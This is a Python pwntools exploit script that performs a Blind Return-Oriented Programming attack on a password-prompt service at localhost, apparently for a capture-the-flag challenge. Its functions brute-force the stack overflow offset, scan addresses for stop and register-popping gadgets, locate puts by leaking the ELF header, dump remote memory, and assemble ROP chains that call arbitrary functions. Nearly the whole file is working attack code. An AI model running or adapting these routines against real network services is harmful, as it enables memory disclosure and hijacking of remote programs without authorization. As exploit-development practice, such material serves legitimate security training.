from pwn import *
from LibcSearcher import *
import sys

host = 'localhost'
port = 10001

def get_overflow_length():
	i = 1
	while True:
		try:
			r = remote(host, port)
			r.recvuntil('WelCome my friend,Do you know password?\n')
			r.send('a' * i)
			output = r.recv()
			r.close()
			if not b'No password' in output:
				return i - 1
			else:
				i += 1
		except EOFError:
			r.close()
			return i - 1

def get_stop_gadget(offset):
	addr = 0x400500 #0x400000
	while True:
		try:
			r = remote(host, port)
			r.recvuntil('WelCome my friend,Do you know password?\n')
			r.send(b'a' * offset + p64(addr))
			stop_gadget = b'a' * offset + p64(addr)
			open("stop_gadget", "w").write(str(stop_gadget))
			content = r.recv()
			r.close()
			if b'WelCome' in content:
				return addr
			addr += 1
		except EOFError:
			r.close()
			addr += 1
		except PwnlibException:
			pass

# checks if the gadget pops 6 registers
def get_brop_gadget(offset, stop_gadget, addr):
	try:
		r = remote(host, port)
		r.recvuntil('WelCome my friend,Do you know password?\n')
		r.send(b'a' * offset + p64(addr) + p64(0) * 6 + p64(stop_gadget) + p64(0) * 10)
		content = r.recv(timeout=0.1)
		r.close()
		return b'WelCome' in content
	except EOFError:
		r.close()
		return False
	except PwnlibException:
		return get_brop_gadget(offset, stop_gadget, addr)

# checks if it is not just a false alarm
def check_brop_gadget(offset, addr):
	try:
		r = remote(host, port)
		r.recvuntil('WelCome my friend,Do you know password?\n')
		payload = b'a' * offset + p64(addr) + b'a' * 8 * 10
		r.sendline(payload)
		content = r.recv()
		r.close()
		return False
	except EOFError:
		r.close()
		return True
	except PwnlibException:
		return check_brop_gadget(offset, addr)

def find_brop_gadget(offset, stop_gadget):
	addr = 0x400700#0x400000
	while True:
		if get_brop_gadget(offset, stop_gadget, addr) and check_brop_gadget(offset, addr):
			return addr
		addr += 1

def find_puts(offset, rdi_ret, stop_gadget):
	addr = 0x400500#0x400000
	while True:
		try:
			r = remote(host, port)
			r.recvuntil('WelCome my friend,Do you know password?\n')
			r.sendline(b'a' * offset + p64(rdi_ret) + p64(0x400000) + p64(addr) + p64(stop_gadget))
			content = r.recv()
			if b'\x7fELF' in content:
				return addr
			r.close()
			addr += 1
		except EOFError:
			r.close()
			addr += 1
		except PwnlibException:
			pass

def leak(offset, addr, rdi_ret, puts, stop_gadget):
	# print(hex(addr))
	try:
		r = remote(host, port)
		r.recvuntil('WelCome my friend,Do you know password?\n')
		r.sendline(b'a' * offset + p64(rdi_ret) + p64(addr) + p64(puts) + p64(stop_gadget))
		content = r.recvuntil('WelCome')
		r.close()
		try:
			content = content[:content.index('\nWelCome')]
		except:
			pass
		if content == '':
			content = '\x00'
		return content
	except PwnlibException:
		return leak(offset, addr, rdi_ret, puts, stop_gadget)
	except EOFError:
		r.close()
		return None


def leak_bytes(progress, offset, start, num_bytes, rdi_ret, puts, stop_gadget):
	# print(hex(start))
	addr = start
	res = b''
	while addr < (start + num_bytes):
		if progress:
			progress.status('Leaked 0x%x bytes' % (addr - start))
		data = leak(offset, addr, rdi_ret, puts, stop_gadget)
		if data is None:
			continue
		res += data
		addr += len(data)

	return res

def same_session_leak(r, offset, addr, rdi_ret, puts):
	main = 0x4006c7 #0x400697
	res = b''
	while len(res) < 8:
		r.sendline(b'a' * offset + p64(rdi_ret) + p64(addr) + p64(puts) + p64(main))
		try:
			content = r.recvuntil('WelCome my friend,Do you know password?\n')
		except EOFError:
			sleep(0.5)
			continue
		try:
			content = content[:content.index('\nWelCome')]
		except:
			pass
		if content == '':
			content = '\x00'
		res += content
		addr += len(content)
	return res

def call_function(offset, func, rdi, rdi_ret, return_addr):
	return b'a' * offset + p64(4195678) + p64(rdi_ret) + p64(rdi) + p64(func) + p64(return_addr)
	#return b'a' * offset + p64(rdi_ret) + p64(rdi) + p64(func) + p64(return_addr)
	# 4195678 is the return gadget; get this from running get_gadgets.py

if __name__ == '__main__':
	r = remote(host, port)
	r.recvuntil('WelCome my friend,Do you know password?\n')
	r.interactive()

	




